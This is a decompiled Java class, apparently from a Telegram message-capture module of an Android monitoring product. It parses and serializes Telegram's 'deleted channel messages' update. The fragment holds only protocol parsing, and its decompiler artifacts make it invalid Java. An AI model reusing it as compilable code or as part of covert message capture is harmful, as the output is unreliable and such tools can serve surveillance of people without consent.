package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_updateDeleteChannelMessages
  extends TLRPC.Update
{
  public static int constructor = -1015733815;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 0;
    String str = null;
    int j = paramAbstractSerializedData.readInt32(paramBoolean);
    this.channel_id = j;
    j = paramAbstractSerializedData.readInt32(paramBoolean);
    int k = 481674261;
    Object localObject;
    if (j != k)
    {
      if (paramBoolean)
      {
        localObject = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        Integer localInteger1 = Integer.valueOf(j);
        arrayOfObject[0] = localInteger1;
        str = String.format("wrong Vector magic, got %x", arrayOfObject);
        ((RuntimeException)localObject).<init>(str);
        throw ((Throwable)localObject);
      }
    }
    else
    {
      j = paramAbstractSerializedData.readInt32(paramBoolean);
      while (i < j)
      {
        localObject = this.messages;
        int m = paramAbstractSerializedData.readInt32(paramBoolean);
        Integer localInteger2 = Integer.valueOf(m);
        ((ArrayList)localObject).add(localInteger2);
        i += 1;
      }
      i = paramAbstractSerializedData.readInt32(paramBoolean);
      this.pts = i;
      i = paramAbstractSerializedData.readInt32(paramBoolean);
      this.pts_count = i;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.channel_id;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.messages.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    Integer localInteger = null;
    for (int k = 0; k < j; k = i)
    {
      localInteger = (Integer)this.messages.get(k);
      i = localInteger.intValue();
      paramAbstractSerializedData.writeInt32(i);
      i = k + 1;
    }
    i = this.pts;
    paramAbstractSerializedData.writeInt32(i);
    i = this.pts_count;
    paramAbstractSerializedData.writeInt32(i);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_updateDeleteChannelMessages.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */